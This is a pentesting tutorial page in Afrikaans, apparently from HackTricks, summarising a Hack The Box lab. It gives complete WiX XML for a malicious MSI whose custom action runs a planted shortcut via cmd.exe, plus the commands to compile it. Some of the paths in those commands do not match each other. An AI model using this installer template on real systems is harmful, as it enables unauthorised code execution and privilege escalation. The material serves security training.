# Skep Malicious MSI en verkry Root

{{#include ../../banners/hacktricks-training.md}}

Die skepping van die MSI-installeerder sal met wixtools gedoen word; spesifiek sal [wixtools](http://wixtoolset.org) gebruik word. Dit is die moeite werd om te noem dat alternatiewe MSI-builders probeer is, maar dat hulle in hierdie spesifieke geval nie suksesvol was nie.<sup>[[1]](#references)</sup>

Vir ’n omvattende begrip van voorbeelde van wix MSI-gebruik, word dit aanbeveel om [hierdie bladsy](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) te raadpleeg. Hier kan jy verskeie voorbeelde vind wat die gebruik van wix MSI demonstreer.<sup>[[2]](#references)</sup>

Die doel is om ’n MSI te genereer wat die lnk-lêer sal uitvoer. Om dit te bereik, kan die volgende XML-kode gebruik word ([xml van hier](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Dit is belangrik om daarop te let dat die Package-element attributes soos InstallerVersion en Compressed bevat, wat onderskeidelik die weergawe van die installer spesifiseer en aandui of die package compressed is of nie.

Die creation process behels die gebruik van candle.exe, ’n tool van wixtools, om ’n wixobject vanaf msi.xml te genereer. Die volgende command moet uitgevoer word:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Daarbenewens is dit die moeite werd om te noem dat ’n image in die post verskaf word, wat die command en die output uitbeeld. Jy kan daarna verwys vir visuele leiding.<sup>[[1]](#references)</sup>

Verder sal light.exe, nog ’n tool van wixtools, gebruik word om die MSI file vanaf die wixobject te skep. Die command wat uitgevoer moet word, is soos volg:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Soortgelyk aan die vorige opdrag, is ’n image by die post ingesluit wat die opdrag en die uitvoer daarvan illustreer.<sup>[[1]](#references)</sup>

Let daarop dat, hoewel hierdie opsomming daarop gemik is om waardevolle inligting te verskaf, dit aanbeveel word om na die oorspronklike post te verwys vir meer omvattende besonderhede en akkurate instruksies.<sup>[[1]](#references)</sup>

## Verwysings

- [1] [Hack The Box - Ethereal: Creating Malicious msi and getting root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [A quick introduction: Create an MSI installer with WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (sien ook [wixtools](http://wixtoolset.org))

{{#include ../../banners/hacktricks-training.md}}
